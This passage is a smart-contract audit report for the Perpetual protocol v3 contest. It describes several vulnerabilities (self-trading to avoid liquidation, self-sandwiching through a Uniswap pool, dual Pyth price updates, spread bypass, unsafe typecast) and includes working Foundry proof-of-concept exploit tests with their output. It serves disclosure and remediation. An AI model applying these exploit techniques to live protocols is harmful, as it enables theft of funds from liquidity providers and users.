# Issue H-1: Users can avoid the possibility of liquidation 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/112 

## Found by 
joicygiore, neon2835
## Summary

When the margin utilization rate of the account is lower than `maintenanceMarginRatio`, the user's account will be liquidated. Therefore, in order to avoid liquidation, users must add margin to the account to make its account value higher than the `maintenance margin requirement`.

However, there is a vulnerability in the system, which can improve the utilization rate of account margin without adding more additional margin, which allows users to avoid the possibility of liquidation.

## Vulnerability Detail

There are two main reasons for this vulnerability:
1. The system does not restrict the account from trading with its own account.
2. The trade price can be different from the Oracle price As long as the price difference remains within a certain range, the transaction can be completed, `priceBandRatio` can be set in the `priceBandRatioMap` of the `config` contract.

The `priceBandRatio` will also be different according to the risk of different markets. Take the ETH market as an example, its `priceBandRatio` is about 5% (I consulted the project personnel on the discord discussion group).

Assuming that users open positions to hold long/short positions in ETH market. At this time, the user trades with himself, he can manipulate the trade price, thus manipulating the margin utilization rate of the account.

Let the code speak for itself, here's my test file: `MyTest.t.sol`, just put it in the `test/clearingHouse` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "../oracleMaker/OracleMakerIntSetup.sol";
import { ClearingHouse } from "../../src/clearingHouse/ClearingHouse.sol";
import { IClearingHouse } from "../../src/clearingHouse/IClearingHouse.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import { LibError } from "../../src/common/LibError.sol";
import "forge-std/console.sol";


contract MyTest is OracleMakerIntSetup {
    bytes public makerData;
    address public taker = makeAddr("taker");
    address public lp = makeAddr("lp");
    struct MakerOrder {
        uint256 amount;
    }

    function setUp() public override {
        super.setUp();

        makerData = validPythUpdateDataItem;

        _mockPythPrice(150, 0);
        _deposit(marketId, taker, 500e6);
        maker.setValidSender(taker, true);

        deal(address(collateralToken), address(lp), 2000e6, true);
        vm.startPrank(lp);
        collateralToken.approve(address(maker), 2000e6);
        maker.deposit(2000e6);
        vm.stopPrank();
    }

    function test_imporveMarginRatio() public{
        vm.startPrank(taker);
        _mockPythPrice(150, 0);
        uint price = 150 * 1e18;
        // taker long ether with 1500 usd
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: makerData
            })
        );
        console.log("---------------- before ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));

        // taker trade with himself
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(taker), //NOTE maker equel taker
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: abi.encode(MakerOrder({
                    amount: 10.5 ether //NOTE suppose 5% band
                }))
            })
        );
        console.log("\r");
        console.log("---------------- after ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));

    }

    function test_avoidLiquidation() public{
        vm.startPrank(taker);
        _mockPythPrice(150, 0);
        // taker long ether with 1500 usd
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: makerData
            })
        );

        uint price = 109 * 1e18; //The price that make users to be liquidated
        console.log("---------------- normal ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));
        console.log("isLiquidatable", clearingHouse.isLiquidatable(marketId, taker, price));

        // taker trade with himself
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(taker), //NOTE maker equel taker
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: abi.encode(MakerOrder({
                    amount: 10.5 ether //NOTE suppose 5% band
                }))
            })
        );
        console.log("\r");
        console.log("---------------- after taker trade with himself -------------------");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));
        console.log("isLiquidatable", clearingHouse.isLiquidatable(marketId, taker, price));
        vm.stopPrank();
    }

    function printLegacyMarginProfile(LegacyMarginProfile memory _legacy) private view {
        console.log("\r");
        console.log("accountValue:");
        console.logInt(_legacy.accountValue);
        console.log("\r");

        console.log("marginRatio:");
        console.logInt(_legacy.marginRatio);
        console.log("\r");
    }
}
```

First, run the `test_imporveMarginRatio` function to verify whether the margin utilization rate can be improved, run:

```shell
forge test --match-path test/clearingHouse/MyTest.t.sol --match-test test_imporveMarginRatio -vvv
```
Get the results:

```shell
Ran 1 test for test/clearingHouse/MyTest.t.sol:MyTest
[PASS] test_imporveMarginRatio() (gas: 1434850)
Logs:
  ---------------- before ------------------- 
  
  accountValue:
  500000000000000000000
  
  marginRatio:
  333333333333333333
  
  
  ---------------- after ------------------- 
  
  accountValue:
  500000000000000000000
  
  marginRatio:
  349999999999999999
  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.51ms (4.20ms CPU time)
```

We can see that with the `accountValue` unchanged, the margin utilization rate has increased from `333333333333333333` to `349999999999999999`. Please note that this is only when `priceBandRatio` is equal to 5%, the greater the value of `priceBandRatio`, the greater the margin ratio that can be increased!

Then let's continue running the `test_avoidLiquidation` function, run:

```shell
forge test --match-path test/clearingHouse/MyTest.t.sol --match-test test_avoidLiquidation -vvv
```

Get the results:

```shell
Ran 1 test for test/clearingHouse/MyTest.t.sol:MyTest
[PASS] test_avoidLiquidation() (gas: 1528984)
Logs:
  ---------------- normal ------------------- 
  
  accountValue:
  90000000000000000000
  
  marginRatio:
  60000000000000000
  
  isLiquidatable true
  
  ---------------- after taker trade with himself -------------------
  
  accountValue:
  90000000000000000000
  
  marginRatio:
  62999999999999999
  
  isLiquidatable false

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.90ms (4.57ms CPU time)
```

Through the test results, it is found that the account should have met the conditions for liquidation, and by constructing its own transactions with itself, it can not be liquidated any more.

## Impact

By trading with themselves, users can improve their margin utilization without adding additional margin, which allows users to avoid the possibility of liquidation

## Code Snippet

Although the code snippet that caused the vulnerability is complex, the main reason is in the `_openPosition` function of the `ClearingHouse` contract:

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L267-L356

## Tool used

Manual Review
Foundry Vscode

## Recommendation

Forcibly restrict users from trading with their own accounts.
Add judgment conditions to the `_openPosition` function of the `ClearingHouse` contract:

```solidity
require( taker != params.maker, "Taker can not equal to Maker" );
```




## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  taker should not be equal to maker; high(2)



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/7.

# Issue H-2: Attackers can sandwich their own trades up to the price bands 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/119 

## Found by 
IllIllI, santipu\_
## Summary

Malicious users can sandwich their own SpotHedgeBaseMaker trades up to the price band cap


## Vulnerability Detail

The SpotHedgeBaseMaker allows one to settle trades against a UniswapV3 pool. The assumption is that the pool prices tokens properly, and any imbalance in the pool is reflected in the price paid/amount received by the trader interacting with the SpotHedgeBaseMaker. This assumption is incorrect, because an attacker can sandwich their own trade, taking value out of the Perpetual system.

The attacker would get a large flash loan, imbalance the pool, use the ClearingHouse to settle and opening trade, then re-balance the pool, all in the same transaction. 


## Impact

For example, assume the actual exchange rate is $4,000/1WEth, and the attacker is able to skew it such that the exchange rate temporarily becomes $1/1WEth. The attacker opening a short of 1Eth means that the SpotHedgeBaseMaker ends up going long 1Eth, and hedges that long by swapping 1WEth for $1. The attacker ends up using ~1 in margin to open the short. After the attacker unwinds the skew, they've gained ~1WEth (~$4k) from the rebalance, and they can abandon the perp account worth -$4k.

In reality, the attacker won't be able to skew the exchange rate by quite that much, because there's a price band [check](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L331) at the end of the trade, ensuring that the price gotten on the trade is roughly equivalent to the oracle's price. The test [comments](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1271) indicate that the bands are anticipated to be +/- 10%. If the price bands are set to zero (the swap price must be the oracle price), then the SpotHedgeBaseMaker won't be usable at all, since uniswap charges a fee for every trade. If the bands are widened to be just wide enough to accommodate the fee, then other parts of the system, such as the OracleMaker won't work properly (see other submitted issue). Therefore, either _some_ value will be extractable, or parts of the protocol will be broken.

Because of these restrictions/limitations I've submitted this as a Medium.


## Code Snippet

The SpotHedgeBaseMaker doesn't require that the [sender](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L281) be the [Gateway/GatewayV2](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L231-L232), so anyone can execute it directly from the ClearingHouse:
```solidity
// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.isValidSender()   #1

514        function isValidSender(address) external pure override returns (bool) {
515            return true;
516:       }
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L504-L526


## Tool used

Manual Review


## Recommendation

Require that SpotHedgeBaseMaker be executed by a relayer



## Discussion

**42bchen**

```
// ETH oracle 100, spot 100 (100 ETH, 10000 USDC) assume no fee, full range v3 liquidity
// user flashLoan buy ETH -> spot 400 (50 ETH, 20000 USDC), user borrow 10000 USDC to swap, get 50 ETH
// user open short position on SHBM
// - SHBM sell 1 ETH -> (51 ETH,19607.84 USDC) -> get 392.16 USDC
// - user openNotional 392.16 USDC, SHBM openNotional -392.16 USDC
// user sell 50 ETH to pool (101 ETH, 9,900.99 USDC), get 9706.85 USDC
// result:
// - user profit: -10000 (borrow debt) + 292.16 (system profit) + 9706.85 (from selling ETH) = -1
// - SHBM profit: 392.16 (sell ETH) + -292.16 (system profit) = 100
// user didn't has profit
```

the user profit in the system does not reflect the real profit in the whole attack operation; the attacker needs some cost to push the price.
Our spotHedgeMaker is hedged, and our system total pnl = 0

**IllIllI000**

@42bchen can you take a look at this test case? I believe it shows that sandwiching can be profitable as long as there's enough of a price difference between the pyth price and the uniswap price (note that it's not trading against the OracleMaker - only against the SHBM). Change `spotPoolFee` to be `100` in SpotHedgeBaseMakerForkSetup.sol, then add this test as perp-contract-v3/test/spotHedgeMaker/Sandwich.sol
```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

// forge test --match-test testSandwich -vv

import "forge-std/Test.sol";
import "../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import "../../src/common/LibFormatter.sol";
import { SignedMath } from "@openzeppelin/contracts/utils/math/SignedMath.sol";

contract priceDivergence is SpotHedgeBaseMakerForkSetup {

    using LibFormatter for int256;
    using LibFormatter for uint256;
    using SignedMath for int256;

    address public exploiter = makeAddr("Exploiter");
    OracleMaker public oracle_maker;

    function setUp() public override {
        super.setUp();
        oracle_maker = new OracleMaker();
        _enableInitialize(address(oracle_maker));
        oracle_maker.initialize(marketId, "OM", "OM", address(addressManager), priceFeedId, 1e18);
        config.registerMaker(marketId, address(oracle_maker));
        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));
        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);
        oracle_maker.setMaxSpreadRatio(0.1 ether);
        oracle_maker.setValidSender(exploiter,true);
        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);
        _mockPythPrice(2000,0);
    }

    function testSandwich() public {
       // deposit 2k collateral as margin for exploiter
       _deposit(marketId, exploiter, 2_000e6);

       // deposit 2000 base tokens ($4M) to the HSBM
       vm.startPrank(makerLp);
       deal(address(baseToken), makerLp, 2000e9, true);
       baseToken.approve(address(maker), type(uint256).max);
       maker.deposit(2000e9);
       vm.stopPrank();

       // exploiter has 43 base tokens ($86K)
       deal(address(baseToken), exploiter, 43e9, true);

       // exploiter balances at the start
       uint256 baseBalanceStart = baseToken.balanceOf(exploiter);
       console.log("exploiter initial values (margin, collateral, base)");
       console.logInt(vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals()));
       console.log(collateralToken.balanceOf(exploiter));
       console.log(baseBalanceStart);

       // the price gapped ~7% within the last 60 seconds, and nobody has updated the pyth price,
       // but the uniswap pool has already adjusted
       int64 oldPrice = 2000 * 93 / 100;
       _mockPythPrice(oldPrice,0);

       // first stage: skew in favor of collateral token
       vm.startPrank(exploiter);
       baseToken.approve(address(uniswapV3Router), type(uint256).max);
       uniswapV3Router.exactInput(
           ISwapRouter.ExactInputParams({
               path: uniswapV3B2QPath,
               recipient: exploiter,
               deadline: block.timestamp,
               amountIn: baseToken.balanceOf(exploiter),
               amountOutMinimum: 0
           })
        );

        // second stage: open short position on SHBM
        (int256 pbT, int256 pqT) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: true,
                isExactInput: true,
                amount: 2e18,
                oppositeAmountBound: 1,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        // third stage: swap back to fix the skew
        collateralToken.approve(address(uniswapV3Router), type(uint256).max);
        uniswapV3Router.exactInput(
                ISwapRouter.ExactInputParams({
                    path: uniswapV3Q2BPath,
                    recipient: exploiter,
                    deadline: block.timestamp,
                    amountIn: collateralToken.balanceOf(exploiter),
                    amountOutMinimum: 0
                })
            );

       console.log("exploiter ending values (margin, collateral, base)");
       uint256 baseBalanceFinish = baseToken.balanceOf(exploiter);
       console.logInt(vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals()));
       console.log(collateralToken.balanceOf(exploiter));
       console.log(baseBalanceFinish);

       // gain is for more than one ETH, which is enough to abandon the collateral in the vault
       console.log("Gain:", baseBalanceFinish - baseBalanceStart);

       vm.stopPrank();
    }
}
```

output:
```text
Logs:
  exploiter initial values (margin, collateral, base)
  2000000000
  0
  43000000000
  exploiter ending values (margin, collateral, base)
  2000000000
  0
  44018525544
  Gain: 1018525544
```

**paco0x**

@IllIllI000 thanks for your POC scripts. After carefully analyzing the numbers in this test case, I believe that the exploiter's profit is caused by bad debt under the assumption of deviation in pyth prices in 60s (7% in this case). 

In this test, the exploiter's actual source of income is that he increased his buying power by using a stale price for opening position. He short 2 ETH with avg price 964, this position passed the IM ratio check since the price is 1860 instead of 2000 in contract. And he'll be in bad debt after the price updated to 2000 in the contract. The SHBM is always hedged and does not lose money.

To mitigate the price deviation issue, we're currently using a permissioned keeper to settle user's orders with makers, but seems users can still open position directly with SHBM to bypass the keeper. And if the price deviation issue exists, there'll be a room to intentionally generate bad debt and make profit, just like in this test case.

So I agree this issue is valid, but under the price deviation assumption. If you have any other idea that can bypass this assumption, I would agree to elevate the severity level of this issue.

The initial idea to solve this issue is: 
1. use a relayer to settle orders with SHBM
2. impose some restrictions on the average price of open positions, in order to prevent avg price from deviating too much from the oracle.

Thanks a lot for you great work!

**paco0x**

> @IllIllI000 thanks for your POC scripts. After carefully analyzing the numbers in this test case, I believe that the exploiter's profit is caused by bad debt under the assumption of deviation in pyth prices in 60s (7% in this case).
> 
> In this test, the exploiter's actual source of income is that he increased his buying power by using a stale price for opening position. He short 2 ETH with avg price 964, this position passed the IM ratio check since the price is 1860 instead of 2000 in contract. And he'll be in bad debt after the price updated to 2000 in the contract. The SHBM is always hedged and does not lose money.
> 
> To mitigate the price deviation issue, we're currently using a permissioned keeper to settle user's orders with makers, but seems users can still open position directly with SHBM to bypass the keeper. And if the price deviation issue exists, there'll be a room to intentionally generate bad debt and make profit, just like in this test case.
> 
> So I agree this issue is valid, but under the price deviation assumption. If you have any other idea that can bypass this assumption, I would agree to elevate the severity level of this issue.
> 
> The initial idea to solve this issue is:
> 
> 1. use a relayer to settle orders with SHBM
> 2. impose some restrictions on the average price of open positions, in order to prevent avg price from deviating too much from the oracle.
> 
> Thanks a lot for you great work!

Another thing to add on, in this test case, we didn't set the price band in `Config` contract. If we add a price band of 20% in the `setUp` like:

```
 config.setPriceBandRatio(marketId, 0.2e18);
```

The exploiter cannot open his position since the trade price deviates too much from oracle price. The difficulty of this attack will significantly increase with a effective price band.

**IllIllI000**

thanks @paco0x in [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/128) issue, I point out that the price bands can be bypassed via sandwich as well, by using different pyth prices. Please let me know your thoughts on that one as well, there, since it's currently marked as a duplicate of one that is marked as sponsor-disputed.

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/19.

# Issue H-3: Two Pyth prices can be used in the same transaction to attack the LP pools 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/123 

## Found by 
0x73696d616f, Bauer, IllIllI, PUSH0, ge6a, jokr, nuthan2x
## Summary

Pyth oracles use a pull model, where the consumer of the price needs to provide a signed price from an offline provider. There are no guarantees that the price at the current time is the freshest price, which means an attacker can enter an LP position at one base price, and exit in another, all in the same transaction.


## Vulnerability Detail

The OracleMaker and SpotHedgeBaseMaker both allow LPs to contribute funds in exchange for getting an LP position. Outside of the requirment that the current price is within the [maxAge](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L83), there are no other freshness checks. An attacker can create a contract which, given two signed base prices, calls [`updatePrice()`](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L51) and `deposit()`s at the lower price, then calls `updatePrice()` at the higher price, and calls `withdraw()` at the higher price, for a risk-free profit.

For both the OracleMaker and the SpotHedgeBaseMaker, there are no fees for doing `deposit()`/`withdraw()`, and a flash loan can be used to magnify the effect of any price difference between two oracle readings. While both makers support a having a whitelist for who is able to deposit/withdraw, the code [doesn't](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L156) require one, the whitelist isn't mentioned in the contest readme, and the comments in [both](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L270-L272) [makers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L196-L198) anticipate having to deal with malicious LPs. It appears that the whitelist will be used to ensure [first-depositor inflation](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/README.md?plain=1#L65) [attacks](https://duckduckgo.com/?q=ethereum+%22inflation+attack%22&ia=web) are mitigated until the pools contain sufficient capital.

The fact that there is a `maxAge` available does not prevent the issue, because Pyth updates are multiple times a second, whereas a block can only have one timestamp.


## Impact

Value accrual that should have gone to the existing LPs is siphoned off by the attacker.


## Code Snippet

The number of shares given depends on whatever the most recently stored price is:
```solidity
// File: src/maker/OracleMaker.sol : OracleMaker.deposit()   #1

189 @>             uint256 price = _getPrice();
...    
201 @>             uint256 vaultValueXShareDecimals = _getVaultValueSafe(vault, price).formatDecimals(
202                    INTERNAL_DECIMALS,
203                    shareDecimals
204                );
205                uint256 amountXShareDecimals = amountXCD.formatDecimals(collateralToken.decimals(), shareDecimals);
206:@>             shares = (amountXShareDecimals * totalSupply()) / vaultValueXShareDecimals;
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L189-L206


The amount of collateral given back is based on whatever the most recently stored price is:
```solidity
// File: src/maker/OracleMaker.sol : OracleMaker.withdraw()   #2

234            uint256 redeemedRatio = shares.divWad(totalSupply());
...
241            uint256 price = _getPrice();
242 @>         uint256 vaultValue = _getVaultValueSafe(vault, price);
243            IERC20Metadata collateralToken = IERC20Metadata(_getAsset());
244 @>         uint256 withdrawnAmountXCD = vaultValue.mulWad(redeemedRatio).formatDecimals(
245                INTERNAL_DECIMALS,
246                collateralToken.decimals()
247:           );
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L234-L247


The SpotHedgeBaseMaker has the [same](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L274-L283) [issue](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L320-L325).


## Tool used

Manual Review


## Recommendation

Require that LP deposits and withdrawals be done by the trusted relayers



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  The readMe says : "Oracle (Pyth) is expected to accurately report the price of market"



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/4.

# Issue M-1: OracleMaker's price with spread does not take into account the new position 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25 

The protocol has acknowledged this issue.

## Found by 
IllIllI, PUSH0
## Summary

OracleMaker's `_getBasePriceWithSpread()` does not take into account the opening position's size, but only on the current position of the Maker.

This means there is no price impact protection against large trades (or any trades at all) for the Oracle Maker. Anyone can then bypass the spread by opening a reverse position before actually opening their intended position.

## Vulnerability Detail

To reduce risky positions, the Oracle Maker will quote a slightly worse price (for the trader) than the actual Oracle price for any positions that increases risk. This is also mentioned in the [audit docs](https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4), Dynamic Premium section.

When a new position is requested, the Oracle Maker quotes a price that includes this spread:

```solidity
function fillOrder(
    bool isBaseToQuote,
    bool isExactInput,
    uint256 amount,
    bytes calldata
) external onlyClearingHouse returns (uint256, bytes memory) {
    uint256 basePrice = _getPrice();
    uint256 basePriceWithSpread = _getBasePriceWithSpread(basePrice, isBaseToQuote); // @audit here
```

There is no spread when the new position reduces risk (e.g. if the current Maker position is +3 ETH, and the new order implies -1 ETH, then the Maker will quote the oracle price directly).

However, `_getBasePriceWithSpread()` never uses the order's amount, therefore large positions will be quoted the same price as small positions, i.e. there is no price impact. This issue also exists if the new position passes the zero mark, where the Maker thinks it's de-risking, while in reality it's being subject to much more risk in the opposite direction.
- Suppose the Oracle Maker's current total position is 1 ETH long (+1 ETH)
- Someone opens a 100 ETH long position, the Oracle Maker thinks it's de-risking by being able to open a 100 ETH short, and quotes the oracle price.
- After the trade, the Maker is actually in a much riskier position of 99 ETH short (-99 ETH)

Anyone can then bypass the spread completely (or partially) by opening a position in the opposite direction before the intended direction:
- The Oracle Maker's current total position is 1 ETH long (+1 ETH).
- Alice wants to open a 10 ETH long (+10 ETH) position.

If Alice sends a 10 ETH long order now, she would have to accept the base price spread and get a slightly worse price than the Pyth oracle price. However Alice can bypass the spread by sending the following two orders in quick succession to the relayer:
- First order: 1 ETH short (-1 ETH)
  - The Maker thinks it's de-risking, so it quotes the oracle price directly.
  - After this order, the Maker has 0 ETH position.
- Second order: 11 ETH long (+11 ETH)
  - Since the Maker's position is zero, it quotes the oracle price.
  - Alice has opened a net total of +10 ETH as intended. However she is not subject to the price spread.
 
Alice was able to bypass the premium from the spread model, and force the Maker to quote exactly the Pyth oracle price. Note that Alice doesn't have to fully bypass the spread, she could have just opened a -0.5 ETH first and would still largely bypass the spread already. 

## Impact

- Dynamic Premiums from the price spread can be bypassed completely, traders can always be quoted the oracle price without spread (or with a heavy reduction of the spread).
- Maker is exposed to more risk than the intended design.

## Code Snippet

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L272

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L401-L409

## Tool used

Manual review

## Recommendation

`_getBasePriceWithSpread()` must take into account the average spread of the Maker's position before and after the trade, not just the position before the trade.
- See proof [here](https://sips.synthetix.io/sips/sip-279/#technical-specification). Note this formula still works when the new position movement crosses the zero mark, as the integral of a constant zero function is zero.



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium



**rc56**

@lnxrp: 
- Won't fix
- It is true that the trick (reverse position before actually opening their intended position) could bypass OracleMaker's  spread, but the impact is considered a degradation (high risk exposure without proper compensation) of maker performance instead of a critical vulnerability
- Note the maker has `minMarginRatio` which protects it from taking too much exposure. The parameter had been set conservative (`minMarginRatio = 100%`) from the start so we have extra safety margin to observe its real-world performance and improve it iteratively

# Issue M-2: Unsafe typecast can cause incorrect computation for the funding fee 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/48 

## Found by 
0xRobocop
## Summary

The `getCurrentFundingRate` function makes an unsafe type cast of the settled margin of the base pool contract.

## Vulnerability Detail

The variable `totalDepositedAmount` is computed via calling `getSettledMargin` which is just the `margin + unsettledPnL` from the base pool account. This variable can be negative if the base pool account has incurred losses such that `unsettledPnL > margin`. The issue is that this variable is typecasted to uint256 without validating if it is negative or not.

## Impact

In the case of a black swan event where `totalDepositedAmount` is negative then the typecast will cause `maxCapacity` to be computed to an incorrect value which in turns make the computation of the `fundingRate` incorrect.

## Code Snippet

Code snippet of the unsafe type cast:

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L123

## Tool used

Manual Review

## Recommendation

Use `toUint256()` instead of a raw typecast.



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/8.

# Issue M-3: In certain cases, users are unable to settle their orders with the PartialFill trade type. 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/95 

## Found by 
ether\_sky
## Summary
There are 2 `trade` types available:  `FoK` or `PartialFill`.
Users have the option to partially settle their `orders`.
However, in some cases, they can't settle their `orders.
## Vulnerability Detail
A user creates an `order` with the `PartialFill` `trade` type and a size of `S`.
Initially, he settles `50%` of this `order`.
At this point, the `totalFilledAmount` of this `order` has a value of `S/2`.
```solidity
function _fillTakerOrder(
    InternalContext memory context,
    SettleOrderParam memory settleOrderParams
) internal returns (InternalWithdrawMarginParam memory, uint256) {
    _getOrderGatewayV2Storage().totalFilledAmount[takerOrder.getKey()] += settleOrderParams.fillAmount;
}
```
After some time, the user attempts to settle the remaining `50%` of that `order`.
In the `_verifyOrder` function, we check whether there is enough `positionSize` available to settle this `order` if the `action` of the `order` is `ReduceOnly`.
However, the issue arises from not accounting for the previously settled amount.
```solidity
function _verifyOrder(IVault vault, Order memory order, uint256 fillAmount) internal view {
      uint256 totalFilledAmount = getOrderFilledAmount(order.owner, order.id);
      if (fillAmount > openAmount - totalFilledAmount) {
          revert LibError.ExceedOrderAmount(order.owner, order.id, totalFilledAmount);
      }
      if (order.action == ActionType.ReduceOnly) {
          int256 ownerPositionSize = vault.getPositionSize(order.marketId, order.owner);

          if (order.amount * ownerPositionSize > 0) {
              revert LibError.ReduceOnlySideMismatch(order.owner, order.id, order.amount, ownerPositionSize);
          }

          if (openAmount > ownerPositionSize.abs()) {  // @audit, here
              revert LibError.UnableToReduceOnly(order.owner, order.id, openAmount, ownerPositionSize.abs());  
          }
      }
}
```
In the initial settlement, half of the `order` was settled.
After the settlement, the `positionSize` decreases by `S/2` also and there are only `S/2` remaining in the `order`.
Therefore, we should compare `S/2` with the current `positionSize`.
However,  we compare `S` again without accounting for the previously settled amount.
As a result, the current `positionSize` might be lower than `S`, leading to the potential reversal of the settlement.
## Impact
This is a DoS and users can lose funds as gas fees.
## Code Snippet
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L336
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L513-L515
## Tool used

Manual Review

## Recommendation
```solidity
function _verifyOrder(IVault vault, Order memory order, uint256 fillAmount) internal view {
      uint256 totalFilledAmount = getOrderFilledAmount(order.owner, order.id);
      if (fillAmount > openAmount - totalFilledAmount) {
          revert LibError.ExceedOrderAmount(order.owner, order.id, totalFilledAmount);
      }
      if (order.action == ActionType.ReduceOnly) {
          int256 ownerPositionSize = vault.getPositionSize(order.marketId, order.owner);

          if (order.amount * ownerPositionSize > 0) {
              revert LibError.ReduceOnlySideMismatch(order.owner, order.id, order.amount, ownerPositionSize);
          }

-          if (openAmount > ownerPositionSize.abs()) { 
+          if (openAmount - totalFilledAmount > ownerPositionSize.abs()) { 
              revert LibError.UnableToReduceOnly(order.owner, order.id, openAmount, ownerPositionSize.abs());  
          }
      }
}
```



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/6.

# Issue M-4: There may be excess funds in the PnL pool or bad debt due to the funding fee. 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/102 

The protocol has acknowledged this issue.

## Found by 
ether\_sky
## Summary
There are two types of `makers`: `OracleMaker` and `SpotHedgeBaseMaker`, where `LPs` can deposit funds.
`Traders` can then execute their `orders` against these `makers`.
To incentivize `LPs`, several mechanisms exist for these `makers` to profit.
One is the `borrowing fee`, which both `makers` can benefit from.
Another is the `funding fee`, which specifically benefits `OracleMaker`.
The `funding fee` incentivizes users to maintain `positions` with the same direction of `OracleMaker`.
However, due to the `funding fee`, there may be excess funds in the `PnL pool` or occurrences of `bad debt`.
## Vulnerability Detail
